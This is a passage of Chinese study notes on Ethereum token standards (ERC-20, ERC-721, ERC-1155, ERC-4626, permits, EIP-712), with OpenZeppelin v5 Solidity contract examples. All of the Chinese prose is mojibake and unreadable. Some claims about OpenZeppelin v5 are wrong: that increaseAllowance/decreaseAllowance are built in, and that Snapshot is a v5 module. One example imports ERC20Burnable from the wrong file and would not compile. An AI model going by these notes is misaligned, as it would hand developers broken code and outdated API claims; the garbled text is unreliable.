  - å¯¹æœªçŸ¥åœ°å€ä¼˜å…ˆä½¿ç”¨ safeTransferFromï¼Œé¿å… NFT è¢«è½¬è¿›ä¸æ”¯æŒçš„åˆçº¦å¯¼è‡´â€œé»‘æ´â€
  - checks-effects-interactions åŸåˆ™ï¼šåœ¨å¯¹å¤–è°ƒç”¨å‰æ›´æ–°çŠ¶æ€ï¼Œå¿…è¦æ—¶åŠ  ReentrancyGuard
- å…ƒæ•°æ®
  - tokenURI è¿”å› JSON å…ƒæ•°æ® URLï¼ˆå¯ HTTP/IPFS/Arweave/data URIï¼‰
  - å¤§é›†åˆå»ºè®® baseURI + tokenId æ‹¼æ¥ï¼Œæˆ– on-chain SVG/JSONï¼ˆéœ€æ³¨æ„ gasï¼‰
- æ„é€  tokenId
  - å¸¸ç”¨è‡ªå¢è®¡æ•°å™¨ï¼ˆå¦‚ OpenZeppelin Countersï¼‰
  - è‹¥éœ€éšæœº/ç¨€æœ‰åº¦åˆ†å¸ƒï¼Œæ…ç”¨é“¾ä¸Šéšæœºï¼ˆéœ€ VRF/é¢„æ‰¿è¯ºç­‰æŠ—æ“çºµæœºåˆ¶ï¼‰
- Gas/å¯æ‰©å±•æ€§
  - å°½é‡é¿å… IERC721Enumerableï¼›é“¾ä¸Šæšä¸¾æ˜‚è´µ
  - å¤§è§„æ¨¡é›†åˆï¼šè€ƒè™‘ EIPâ€‘2309ã€ç¨€ç–å­˜å‚¨å‹ç¼©ã€æˆ–ä½¿ç”¨ä¼˜åŒ–å®ç°ï¼ˆå¦‚æ‰¹é‡ mint çš„ gas æ¨¡å¼ã€ç¨€ç– ownership è®°å½•ï¼‰
  - å‡çº§æ€§ï¼šä½¿ç”¨ä»£ç†ï¼ˆUUPS/Transparentï¼‰ï¼Œæ³¨æ„æ„é€ å‡½æ•°é€»è¾‘è¿ç§»åˆ° initializer

å››ã€å¯ç”¨ ERCâ€‘721ï¼ˆåŸºäº OpenZeppelinï¼‰
åŒ…å«ï¼šå®‰å…¨è½¬ç§»ã€BaseURIã€ä»…æ‹¥æœ‰è€…é“¸é€ 

```solidity:contracts/MyNFT.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

contract MyNFT is ERC721, Ownable {
    using Strings for uint256;

    string private _baseTokenURI;
    uint256 private _nextId;

    constructor(string memory name_, string memory symbol_, string memory baseURI_) ERC721(name_, symbol_) Ownable(msg.sender) {
        _baseTokenURI = baseURI_;
        _nextId = 1;
    }

    function setBaseURI(string calldata baseURI_) external onlyOwner {
        _baseTokenURI = baseURI_;
    }

    function mint(address to) external onlyOwner returns (uint256 tokenId) {
        tokenId = _nextId++;
        _safeMint(to, tokenId); // ä½¿ç”¨ safeMintï¼Œè‡ªåŠ¨è°ƒç”¨ onERC721Received
    }

    function _baseURI() internal view override returns (string memory) {
        return _baseTokenURI;
    }

    // å¦‚æœéœ€è¦è‡ªå®šä¹‰ tokenURIï¼Œå¯è¦†ç›–å¦‚ä¸‹
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        _requireOwned(tokenId);
        string memory base = _baseURI();
        return bytes(base).length > 0 ? string(abi.encodePacked(base, tokenId.toString(), ".json")) : "";
    }
}
```

# 2025-08-19

# 1. EIP-20

**å¼ºåˆ¶æ¥å£**

- `totalSupply() â†’ uint256`
    
- `balanceOf(address) â†’ uint256`
    
- `transfer(address to, uint256 value) â†’ bool`
    
- `allowance(address owner, address spender) â†’ uint256`
    
- `approve(address spender, uint256 value) â†’ bool`
    
- `transferFrom(address from, address to, uint256 value) â†’ bool`
    
- äº‹ä»¶ï¼š`Transfer(address indexed from, address indexed to, uint256 value)`ï¼›`Approval(address indexed owner, address indexed spender, uint256 value)`
    

**å¯é€‰å…ƒæ•°æ®ï¼ˆä¸»æµå®ç°éƒ½æä¾›ï¼‰**

- `name()`, `symbol()`, `decimals()`ï¼ˆé€šå¸¸ 18ï¼‰
    

**è¯­ä¹‰ä¸ç»†èŠ‚**

- **è¿”å›å€¼å¿…é¡»æ˜¯ `bool true`**ï¼ˆå†å²ä¸Šä¸€äº›è€åˆçº¦ä¸è¿”å›å€¼ï¼ŒDeFi é‡Œéœ€ç”¨ SafeERC20 é€‚é…ï¼‰ã€‚
    
- **Mint/Burn çš„äº‹ä»¶ï¼š**
    
    - é“¸é€ ï¼š`from = address(0)` çš„ `Transfer(0, to, value)`
        
    - é”€æ¯ï¼š`to = address(0)` çš„ `Transfer(from, 0, value)`
        
- **Approve ç«æ€ï¼ˆAllowance Raceï¼‰**ï¼šå¦‚æœ spender å·²æœ‰é¢åº¦ Aï¼Œä½ æŠŠé¢åº¦æ”¹ä¸º Bï¼Œåœ¨ Mempool å¯è¢«â€œå¤¹å‡»â€ï¼ˆå…ˆèŠ±å…‰ A å†æŠŠ B ç”Ÿæ•ˆï¼‰ã€‚
    
    - ç¼“è§£ï¼šå…ˆ `approve(spender, 0)` å†è®¾ç½®æ–°é¢åº¦ï¼›æˆ–ç›´æ¥ç”¨ **EIP-2612 permit**ï¼**Permit2**ã€‚
        

# 2. DeFi é‡Œæœ€å®¹æ˜“â€œè¸©é›·â€çš„è¡Œä¸ºä¸å¯¹ç­–

- **å‰ç½®æˆæƒä¸¤æ­¥æµï¼ˆapproveâ†’transferFromï¼‰**ï¼šç”¨æˆ·ä½“éªŒå·®ã€Gas å¤šã€ä¸”æœ‰å‰è¿°ç«æ€ã€‚  
    âœ… **å¯¹ç­–**ï¼šä¼˜å…ˆæ”¯æŒ **EIP-2612 Permit**ï¼ˆæˆ–å¼•å¯¼ç”¨æˆ·/å‰ç«¯ä½¿ç”¨ Uniswap **Permit2**ï¼‰ã€‚
    
- **â€œç¨è´¹/é€šç¼©â€ä»£å¸ï¼ˆtransfer ä¼šæ‰£ç¨ï¼‰**ï¼šé‡‘é¢ä¸å®ˆæ’ï¼Œè®¸å¤šåè®®ï¼ˆAMMã€é‡‘åº“ã€æ¡¥ï¼‰è‹¥æ²¡å¯¹æ¥å¥½ä¼šå‡ºé”™ã€‚  
    âœ… **å¯¹ç­–**ï¼šå¤„ç†**åˆ°å¸å€¼ä¸å‘é€å€¼å¯èƒ½ä¸ç›¸ç­‰**ï¼›æˆ–æ˜¾å¼æ‹’ç»éæ ‡å‡†ä»£å¸ã€‚
    
- **ä¸è¿”å› bool çš„è€ ERC-20**ï¼šä¼šåœ¨ä¸¥æ ¼è°ƒç”¨ä¸‹ revertã€‚  
    âœ… **å¯¹ç­–**ï¼šä¸å¤–éƒ¨ä»£å¸äº¤äº’ä¸€å¾‹ç”¨ **SafeERC20**ï¼ˆåŒ…å®¹ä¸è§„èŒƒåˆçº¦ï¼‰ã€‚
    
- **é‡å…¥å‡è®¾**ï¼šERC-20 æœ¬èº«æ— å›è°ƒï¼Œä½†ä¸ **ERC-777** æˆ–è‡ªå®šä¹‰ Hook å…±ç”¨æ—¶éœ€ä¿æŒå¯é‡å…¥å®‰å…¨ï¼ˆæ¯”å¦‚è½¬è´¦å‰åå¤–éƒ¨äº¤äº’ï¼‰ã€‚  
    âœ… **å¯¹ç­–**ï¼š**Checks-Effects-Interactions**ã€å¿…è¦æ—¶ `ReentrancyGuard`ã€å°½é‡â€œå…ˆè®°è´¦å†å¤–è°ƒâ€ã€‚
    

# 3. æŠ€æœ¯æ ˆ

- **è¯­è¨€/ç¼–è¯‘å™¨**ï¼šSolidity ^0.8.xï¼ˆå†…ç½®æº¢å‡ºæ£€æŸ¥ï¼›æ€§èƒ½æ•æ„Ÿå¤„å¯ `unchecked`ï¼‰
    
- **åˆçº¦åº“**ï¼šOpenZeppelin Contractsï¼ˆå»ºè®® v5 åŠä»¥ä¸Šï¼‰
    
    - `ERC20` / `ERC20Permit` / `SafeERC20` / `AccessControl` / `Ownable` / `Pausable` / `Snapshot` / `Votes` ç­‰
        
- **å·¥å…·é“¾**
    
    - å¼€å‘ï¼š**Foundry**ï¼ˆforge + castï¼‰æˆ– **Hardhat**ï¼ˆethersã€typechainï¼‰
        
    - å®‰å…¨ï¼š**Slither**ã€**Mythril**ã€**Echidna**ï¼ˆæ¨¡ç³Šæµ‹è¯•ï¼‰ã€**Foundry fuzz**
        
    - å½¢å¼åŒ–/å®¡è®¡ï¼šCertoraã€Scribbleï¼ˆè§„èŒƒæ³¨é‡Š + é™æ€ä»ªè¡¨ï¼‰
        
- **å‰ç«¯äº¤äº’**ï¼šethers.js / viemï¼›é’±åŒ…æ”¯æŒ EIP-712ï¼ˆMetaMaskã€Safeï¼‰
    
- **ç­¾åæˆæƒ**ï¼šEIP-712ï¼ˆTyped Dataï¼‰ + EIP-2612 æˆ– Permit2
    

# 4. OpenZeppelin v5

### 4.1 æœ€å°å®‰å…¨åŸºçº¿ï¼ˆå«å¢å‡é¢åº¦ APIï¼‰

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MyToken is ERC20 {
    constructor(string memory n, string memory s, uint256 initial)
        ERC20(n, s)
    {
        _mint(msg.sender, initial);
    }

    // OZ v5 å·²å†…ç½® increaseAllowance / decreaseAllowanceï¼ˆé€šè¿‡ ERC20 æ‰©å±•ï¼‰
    // ä½¿ç”¨å‰ç«¯å¼•å¯¼ï¼šä¼˜å…ˆä½¿ç”¨ permitï¼Œfallback åˆ° increase/decrease
}
```

**é‡ç‚¹**

- **Solidity 0.8+** å†…ç½®æº¢å‡ºæ£€æŸ¥ï¼Œè€—æ°”åœºæ™¯å¯åœ¨ä¸å½±å“å®‰å…¨çš„è‡ªå¢/è‡ªå‡é‡Œç”¨ `unchecked`ã€‚
    
- **OpenZeppelin v5** å¯¹å†…éƒ¨ç»“æ„åšäº†æ¸…ç†ä¸ä¼˜åŒ–ï¼ˆè§ 6 èŠ‚ï¼‰ï¼Œé»˜è®¤å®ç°å·²åŒ…å« best-practiceã€‚
    

### 4.2 åŠ å…¥ Permitï¼ˆEIP-2612ï¼‰

```solidity
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract MyPermitToken is ERC20, ERC20Permit {
    constructor(uint256 initial)
        ERC20("MyPermitToken", "MPT")
        ERC20Permit("MyPermitToken") // EIP-712 Domain(name, version, chainId, verifyingContract)
    {
        _mint(msg.sender, initial);
    }
}
```

**é‡ç‚¹**

- ç”¨é’±åŒ…å¼¹çª—ç­¾åï¼ˆEIP-712 typed dataï¼‰ï¼Œåˆçº¦ä¾§ `permit(owner, spender, value, deadline, v, r, s)` å†™å…¥ `nonces` ä¸ `allowance`ã€‚
    
- å‰ç«¯**ä¸€ç¬”äº¤æ˜“**å³å¯å®Œæˆæˆæƒ+ä¸šåŠ¡ï¼›æ˜¾è‘—æ”¹å–„ UX ä¸ Gasã€‚
    

### 4.3 é‡‘åº“/æ²»ç†/é»‘å¤©é¹…æ§åˆ¶ï¼ˆå¯é€‰æ‰©å±•ï¼‰

- **å¯æš‚åœï¼ˆPausableï¼‰**ï¼šé»‘å¤©é¹…æˆ–å®¡è®¡å‘ç°æ¼æ´æ—¶å¿«é€Ÿæ­¢è¡€
    
- **å¿«ç…§ï¼ˆSnapshotï¼‰**ï¼šæ²»ç†/åˆ†çº¢åœºæ™¯çš„å†å²ä½™é¢è¯æ˜
    
- **è®¿é—®æ§åˆ¶ï¼ˆOwnable/AccessControlï¼‰**ï¼šé“¸é€ ã€å›æ”¶ã€ç™½åå•ç®¡æ§
    
- **æŠ•ç¥¨ï¼ˆVotesï¼‰**ï¼šä½™é¢ â†’ æ²»ç†æƒé‡ï¼ˆä¸å¿«ç…§è¯­ä¹‰ä¸€è‡´ï¼‰
    

```solidity
pragma solidity ^0.8.20;

import {ERC20, ERC20Burnable, ERC20Pausable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract GovToken is ERC20, ERC20Burnable, ERC20Pausable, Ownable {
    constructor() ERC20("GovToken", "GOV") Ownable(msg.sender) {
        _mint(msg.sender, 1_000_000e18);
    }

    function pause() external onlyOwner { _pause(); }
    function unpause() external onlyOwner { _unpause(); }

    // é’©å­åœ¨ v5 ä¸­é€šè¿‡å†…éƒ¨ _update ç»Ÿä¸€è°ƒç”¨ï¼ˆè§ç¬¬ 6 èŠ‚ï¼‰
    function _update(address from, address to, uint256 value)
        internal
        override(ERC20, ERC20Pausable)
    {
        super._update(from, to, value);
    }
}
```

# 5. ERC-20 äº¤äº’çš„â€œåè®®ä¾§â€

- **ä½¿ç”¨ `SafeERC20`**ï¼ˆå¯å…¼å®¹ä¸è¿”å› bool çš„â€œå¤è‘£å¸â€ï¼‰    
- ç•™å¿ƒ**åˆ°å¸é‡**ä¸**å‘é€é‡**ä¸ä¸€è‡´çš„â€œç¨è´¹ä»£å¸â€    
- å¯¹æ¥ **Permit/Permit2**ï¼Œå‡å°‘ä¸€æ¬¡ `approve` äº¤æ˜“    

```solidity
pragma solidity ^0.8.20;
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Vault {
    using SafeERC20 for IERC20;
    IERC20 public immutable asset;

    constructor(IERC20 _asset) { asset = _asset; }

    function deposit(uint256 amt) external {
        uint256 beforeBal = asset.balanceOf(address(this));
        asset.safeTransferFrom(msg.sender, address(this), amt);
        uint256 received = asset.balanceOf(address(this)) - beforeBal; // ç¨è´¹ä»£å¸å·®é¢
        // æŒ‰ received è®°è´¦ï¼Œé¿å…é‡‘é¢é”™é…
    }
}
```

# 6. OpenZeppelin v5 â€œä»£ç å±‚é¢çš„å˜åŒ–/ä¼˜åŒ–â€
- **Hooks é‡æ„ä¸º `_update` ç»Ÿä¸€å…¥å£**ï¼š  
    ä»¥å‰å¸¸è§ `_beforeTokenTransfer/_afterTokenTransfer` å·²åœ¨ v5 ä¸­è¢«**ç»Ÿä¸€ä¸º** `ERC20._update(from, to, value)`ã€‚
    
    - ä½ å¦‚æœéœ€è¦åœ¨è½¬è´¦/é“¸é€ /é”€æ¯æ—¶æ’å…¥æ§åˆ¶é€»è¾‘ï¼Œ**é‡å†™ `_update`**ï¼ˆå°±åƒä¸Šé¢ `Pausable` çš„ overrideï¼‰ã€‚
        
- **æ›´ä¸€è‡´çš„è‡ªå®šä¹‰é”™è¯¯ä¸ Gas ä¼˜åŒ–**ï¼š
    
    - v5 å¹¿æ³›ä½¿ç”¨ **custom errors**ã€å»é™¤å†å²åŒ…è¢±ï¼ˆä¸å†éœ€è¦ SafeMathï¼‰ã€‚
        
    - ä¸€äº›å†…éƒ¨å‡½æ•°å¸ƒå±€æ›´åˆ©äºå†…è”ä¸ `unchecked` æ€§èƒ½ä¼˜åŒ–ã€‚
        
- **æ‰©å±•æ¨¡å—è§£è€¦æ›´æ¸…æ™°**ï¼š
    
    - `ERC20Permit`ã€`ERC20Votes`ã€`Snapshot` ç­‰å„å¸å…¶èŒï¼Œç»„åˆæ›´ç›´è§‚ã€‚
        
- **é»˜è®¤å®ç°æ›´â€œå®‰å…¨ä¿å®ˆâ€**ï¼š
    
    - ä¾‹å¦‚ `increaseAllowance`/`decreaseAllowance` æ—©å·²å†…å»ºï¼Œå®˜æ–¹æ¨èæ›¿ä»£ç›´æ¥æ”¹å†™ `approve` çš„æ¨¡å¼ã€‚
        

# 7. Gas/å­˜å‚¨ä¼˜åŒ–æ¸…å•

- **`immutable`**ï¼šä»£å¸çš„ä¸å¯å˜å‚æ•°ï¼ˆå¦‚é‡‘åº“çš„åº•å±‚èµ„äº§åœ°å€ï¼‰ç”¨ `immutable`ï¼Œè¯»æˆæœ¬ä½ã€‚
    
- **`unchecked`**ï¼šä»…åœ¨ä½ **ç»å¯¹ç¡®è®¤**ä¸æº¢å‡ºçš„åœ°æ–¹ä½¿ç”¨ï¼ˆå¦‚ `totalSupply += amount` ç´§è·Ÿ `require`ï¼‰ã€‚
    
- **äº‹ä»¶ç´¢å¼•**ï¼š`Transfer/Approval` çš„ indexed å­—æ®µå·²å›ºå®šï¼›è‡ªå®šä¹‰äº‹ä»¶æ§åˆ¶ `indexed` æ•°é‡ï¼ˆè¿‡å¤šç´¢å¼•ä¼šåŠ æ—¥å¿—æˆæœ¬ï¼‰ã€‚
    
- **Slot æ‰“åŒ…**ï¼š`mapping` æ— æ³•ä¸å…¶å®ƒçŠ¶æ€å˜é‡æ‰“åŒ…ï¼›ä½†å¸¸é‡/å°‘é‡ config å¯æ”¾ä¸€ä¸ª struct é‡Œä¸€èµ·å¸ƒå±€ï¼ˆæ”¶ç›Šæœ‰é™ï¼Œåˆ«è¿‡åº¦ä¼˜åŒ–ï¼‰ã€‚
    
- **å¤–éƒ¨è°ƒç”¨æœ€å°åŒ–**ï¼šæ‰¹é‡è½¬è´¦å°½é‡åœ¨è°ƒç”¨æ–¹å¾ªç¯è€Œä¸æ˜¯è¢«è°ƒç”¨æ–¹å¤šæ¬¡å›è°ƒï¼ˆåè®®è®¾è®¡å±‚é¢ä¼˜åŒ–ï¼‰ã€‚
    

# 8. ä¸â€œæ›´ä¸Šä¸€å±‚â€çš„æ ‡å‡†/ç»„ä»¶ååŒ

- **EIP-2612ï¼ˆPermitï¼‰**ï¼šç­¾åæˆæƒï¼Œæå‡ UXï¼›å¼ºçƒˆå»ºè®®ä½ çš„ä»£å¸å’Œåè®®**åŒæ—¶æ”¯æŒ**ã€‚
    
- **Permit2ï¼ˆUniswap å·¥å…·åˆçº¦ï¼‰**ï¼šä¸€ä¸ªåˆçº¦é›†ä¸­ç®¡ç†æˆæƒä¸ç­¾åæ ¸é”€ï¼Œ**è·¨ä»£å¸/è·¨åˆçº¦**ç»Ÿä¸€ï¼›åè®®æ–¹é›†æˆæœ€çœå¿ƒã€‚
    
- **EIP-4626ï¼ˆé‡‘åº“/Vaultï¼‰**ï¼šå¦‚æœä½ çš„ ERC-20 æ˜¯**æ”¶ç›Šå‡­è¯**æˆ–**ä»½é¢ä»£å¸**ï¼Œç”¨ 4626 ç»Ÿä¸€â€œèµ„äº§â†”ä»½é¢â€æ¢ç®—ï¼ŒDeFi å¯ç»„åˆæ€§å¤§å¢ã€‚
    
- **EIP-712ï¼ˆTyped Dataï¼‰**ï¼šæ‰€æœ‰ç­¾åï¼ˆPermit / off-chain order / meta-txï¼‰åº•å±‚éƒ½ç”¨å®ƒï¼›å‰ç«¯ä¸é’±åŒ…äº¤äº’æ ‡å‡†åŒ–ã€‚
    

# 9. ERC-20 + Permit + Ownable + Pausable

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {ERC20Pausable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract AppToken is ERC20, ERC20Permit, ERC20Pausable, Ownable {
    constructor(uint256 init)
        ERC20("AppToken", "APP")
        ERC20Permit("AppToken")
        Ownable(msg.sender)
    {
        _mint(msg.sender, init);
    }

    function pause() external onlyOwner { _pause(); }
    function unpause() external onlyOwner { _unpause(); }

    // v5ï¼šç»Ÿä¸€ä»è¿™é‡Œæ‹¦æˆªæ‰€æœ‰è½¬è´¦/é“¸é”€é€»è¾‘ï¼ˆPausable å·²åœ¨ super é‡Œå¤„ç†ï¼‰
    function _update(address from, address to, uint256 value)
        internal
        override(ERC20, ERC20Pausable)
    {
        // é£æ§/é»‘åå•/é™é¢‘ç­‰ä¹Ÿå¯å†™åœ¨è¿™é‡Œï¼ˆæ³¨æ„ gas & è¯¯è§¦å‘ï¼‰
        super._update(from, to, value);
    }
}
```

# 10. æµ‹è¯•ä¸å®¡è®¡æ¸…å•(ç†è§£æˆè½¯æµ‹)

- **å•å…ƒæµ‹è¯•**ï¼šæ­£/åè·¯å¾„ã€è¾¹ç•Œï¼ˆ0 å€¼ã€æå¤§å€¼ï¼‰ã€æˆæƒ raceã€ç¨è´¹ä»£å¸æ¨¡æ‹Ÿã€Permit éæ³•ç­¾å/è¿‡æœŸ
    
- **æ¨¡ç³Šæµ‹è¯•**ï¼ˆFoundry `forge test --fuzz` / Echidnaï¼‰ï¼šé’ˆå¯¹ `transfer/transferFrom` ä¸å˜é‡ï¼ˆå®ˆæ’ï¼‰ã€æ€»ä¾›ç»™ä¸å˜ï¼ˆé™¤éé“¸é”€ï¼‰
    
- **é™æ€åˆ†æ**ï¼šSlitherï¼ˆæœªç”¨è¿”å›å€¼ã€å¯é‡å…¥ã€å¯è§æ€§ã€ä¸å¿…è¦å­˜å‚¨å†™ï¼‰
    
- **Gas å¯¹æ¯”**ï¼šFoundry `--gas-report`ï¼›å¯¹ `_update` é‡Œè‡ªå®šä¹‰é€»è¾‘åš A/B

# 2025-08-18

# ğŸ”‘ 1. ERC-20ï¼ˆEIP-20ï¼‰

### ç®€ä»‹

- ä»¥å¤ªåŠæœ€æ—©çš„åŒè´¨åŒ–ä»£å¸æ ‡å‡†ï¼ˆ2015/2017ï¼‰ï¼Œå®šä¹‰äº†ä»£å¸çš„åŸºæœ¬æ¥å£ï¼š`balanceOf`ã€`transfer`ã€`approve`ã€`transferFrom` ç­‰ã€‚
    

### è§£å†³çš„é—®é¢˜

- åœ¨ ERC-20 ä¹‹å‰ï¼Œæ¯ä¸ªé¡¹ç›®è‡ªå®šä¹‰ä»£å¸åˆçº¦æ¥å£ï¼Œç¼ºä¹ç»Ÿä¸€æ ‡å‡†ï¼Œé’±åŒ…/äº¤æ˜“æ‰€éš¾ä»¥å…¼å®¹ã€‚
    
- ERC-20 **ç»Ÿä¸€äº†ä»£å¸æ¥å£** â†’ ä»»ä½•é’±åŒ…ã€DEXã€DeFi åè®®éƒ½èƒ½æ— ç¼é›†æˆã€‚
    

### æŠ€æœ¯æ ˆ / æ›´æ–°

- **Solidity**ï¼šä¸»è¦è¯­è¨€ã€‚
    
- **OpenZeppelin Contracts** æä¾›æˆç†Ÿå®‰å…¨çš„ ERC-20 å®ç°ï¼ˆå« Mintableã€Burnableã€Snapshotã€Pausable æ‰©å±•ï¼‰ã€‚
    
- æŠ€æœ¯æ›´æ–°ï¼šæ”¯æŒ **EIP-2612 permit** æ‰©å±•ï¼ˆé¿å…å¤šæ¬¡äº¤æ˜“ï¼‰ï¼Œä»¥åŠ ERC-777 çš„æ”¹è¿›å°è¯•ï¼ˆä½† ERC-777 å› å¤æ‚æ€§å’Œæ”»å‡»é¢å¤§ï¼Œé‡‡ç”¨åº¦æœ‰é™ï¼‰ã€‚
    



# ğŸ¨ 2. ERC-721ï¼ˆEIP-721ï¼‰

### ç®€ä»‹

- éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰æ ‡å‡†ï¼Œå®šä¹‰äº† `ownerOf`ã€`transferFrom`ã€`safeTransferFrom` ç­‰æ¥å£ã€‚
    

### è§£å†³çš„é—®é¢˜

- ERC-20 åªèƒ½è¡¨ç¤ºåŒè´¨åŒ–èµ„äº§ï¼ˆå¦‚ç¨³å®šå¸ï¼‰ï¼Œæ— æ³•è¡¨ç¤ºå”¯ä¸€èµ„äº§ã€‚
    
- ERC-721 è§£å†³äº† **å”¯ä¸€æ€§ã€æ‰€æœ‰æƒè¯æ˜ã€èµ„äº§ä¸Šé“¾** é—®é¢˜ï¼ˆCryptoKittiesã€è‰ºæœ¯å“ã€æ¸¸æˆèµ„äº§ï¼‰ã€‚
    

### æŠ€æœ¯æ ˆ / æ›´æ–°

- **Solidity + OpenZeppelin**ï¼šERC721 æ ‡å‡†åˆçº¦ã€‚
    
- **EIP-165**ï¼šæ¥å£æ£€æµ‹æ ‡å‡†ï¼Œç”¨äºç¡®è®¤åˆçº¦æ˜¯å¦å®ç° ERC721ã€‚
    
- æŠ€æœ¯æ›´æ–°ï¼šå‡ºç° **ERC-721A**ï¼ˆä¼˜åŒ– gas çš„æ‰¹é‡ Mintï¼ŒAzuki æå‡ºï¼‰å’Œ **ERC-4907**ï¼ˆç§Ÿèµæ‰©å±•ï¼‰ã€‚
    
- åœ¨ DeFi åœºæ™¯ï¼šNFT å¯ä½œä¸ºæŠµæŠ¼ç‰©ï¼ˆNFTfiï¼‰ã€æµåŠ¨æ€§å‡­è¯ï¼ˆUniswap v3 LP NFTï¼‰ã€‚
    



# ğŸ­ 3. ERC-1155ï¼ˆEIP-1155ï¼‰

### ç®€ä»‹

- å¤šèµ„äº§æ ‡å‡†ï¼ˆEnjin æå‡ºï¼‰ï¼Œå…è®¸ä¸€ä¸ªåˆçº¦ç®¡ç† **åŒè´¨åŒ–ä»£å¸ + éåŒè´¨åŒ–ä»£å¸**ã€‚
    

### è§£å†³çš„é—®é¢˜

- ERC-20 & ERC-721 **å„è‡ªç‹¬ç«‹**ï¼Œç®¡ç†å¤æ‚ã€éƒ¨ç½²æˆæœ¬é«˜ã€‚
    
- ERC-1155 è§£å†³äº†ï¼š
    
    - æ‰¹é‡è½¬è´¦/ç®¡ç† â†’ èŠ‚çœ Gasã€‚
        
    - åŒä¸€åˆçº¦ä¸‹ç®¡ç†å¤šç§èµ„äº§ï¼ˆæ¸¸æˆèµ„äº§ã€DeFi å¤šèµ„äº§ç»„åˆï¼‰ã€‚
        

### æŠ€æœ¯æ ˆ / æ›´æ–°

- **Solidity + OpenZeppelin**ï¼šERC1155 å®ç°ã€‚
    
- æŠ€æœ¯æ›´æ–°ï¼šæ‰¹é‡ `safeBatchTransferFrom`ï¼Œæ˜¾è‘—é™ä½ Gasã€‚
    
- åº”ç”¨ï¼šDeFi è¡ç”Ÿå“ï¼ˆå¦‚ Synthetix çš„å¤šèµ„äº§å‘è¡Œï¼‰ã€GameFiã€‚
    



# ğŸ’° 4. ERC-4626ï¼ˆEIP-4626ï¼‰

### ç®€ä»‹

- Vaultï¼ˆæ”¶ç›Šé‡‘åº“ï¼‰ä»£å¸æ ‡å‡†ï¼Œç”¨äºå°†ä»»æ„ ERC-20 èµ„äº§æ‰˜ç®¡å¹¶å‘è¡Œä»½é¢ä»£å¸ï¼ˆVault Tokenï¼‰ã€‚
    

### è§£å†³çš„é—®é¢˜

- åœ¨ DeFi ä¸­ï¼ŒYearnã€Aaveã€Compound ç­‰ Vault/å€Ÿè´·åè®®çš„æ¥å£ä¸ç»Ÿä¸€ã€‚
    
- ERC-4626 **ç»Ÿä¸€ Vault çš„å­˜å–/ä»½é¢é€»è¾‘**ï¼š
    
    - `deposit`ã€`withdraw`ã€`mint`ã€`redeem`ã€‚
        
    - æå‡äº†åè®®é—´çš„ **å¯ç»„åˆæ€§**ã€‚
        

### æŠ€æœ¯æ ˆ / æ›´æ–°

- **Solidity + OpenZeppelin ERC4626** æ¨¡å—åŒ–å®ç°ã€‚
    
- æŠ€æœ¯æ›´æ–°ï¼š
    
    - æ›´é«˜æ•ˆçš„èµ„äº§ä¸ä»½é¢è½¬æ¢ï¼ˆ`convertToAssets`ã€`convertToShares`ï¼‰ã€‚
        
    - ä¸ Uniswap V3ã€Aave ç­‰ç”Ÿæ€ç»„åˆï¼Œæå‡è‡ªåŠ¨åŒ–ç­–ç•¥ï¼ˆè‡ªåŠ¨æ”¶ç›Šèšåˆï¼‰ã€‚
        



# âš¡ 5. EIP-2612ï¼ˆERC-20 Permitï¼‰

### ç®€ä»‹

- ERC-20 çš„æ‰©å±•ï¼Œå¼•å…¥ `permit()`ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ç­¾åæˆæƒï¼Œä¸å¿…æå‰å‘é€ `approve` äº¤æ˜“ã€‚
    

### è§£å†³çš„é—®é¢˜

- ä¼ ç»Ÿ ERC-20 æµç¨‹ï¼š`approve` â†’ `transferFrom`ï¼Œéœ€è¦ **ä¸¤æ¬¡äº¤æ˜“**ï¼Œå¢åŠ æˆæœ¬å’Œ UX ä¸ä½³ã€‚
    
- EIP-2612ï¼šä¸€æ¬¡é“¾ä¸‹ç­¾åï¼Œåˆçº¦å³å¯ç›´æ¥è°ƒç”¨ â†’ å‡å°‘ä¸€æ¬¡äº¤æ˜“ã€èŠ‚çœ Gasã€‚
    
- è¢«å¹¿æ³›åº”ç”¨äº DEXï¼ˆUniswapã€Curveï¼‰ã€èšåˆå™¨ï¼ˆ1inchï¼‰ã€‚
    

### æŠ€æœ¯æ ˆ / æ›´æ–°

- **Solidity** + **EIP-712ï¼ˆTyped Signatureï¼‰** å®ç°ã€‚
    
- **OpenZeppelin ERC20Permit** åº“ç°æˆå¯ç”¨ã€‚
    
- æŠ€æœ¯æ›´æ–°ï¼šUniswap çš„ **Permit2** è¿›ä¸€æ­¥å¢å¼ºå®‰å…¨æ€§ï¼Œæ”¯æŒå¤šåˆçº¦ç»Ÿä¸€æˆæƒã€‚
    



# ğŸ” 6. EIP-712

### ç®€ä»‹

- ç»“æ„åŒ–æ•°æ®ç­¾åæ ‡å‡†ï¼Œç”¨äºå®‰å…¨åœ°é“¾ä¸‹ç­¾åå¹¶é“¾ä¸ŠéªŒè¯ã€‚
    

### è§£å†³çš„é—®é¢˜

- æ™®é€šç­¾åï¼ˆEIP-191ï¼‰ä»…æ˜¯å­—èŠ‚ä¸²ï¼Œç”¨æˆ·éš¾ä»¥éªŒè¯ç­¾åå«ä¹‰ï¼Œå®¹æ˜“è¢«é’“é±¼ã€‚
    
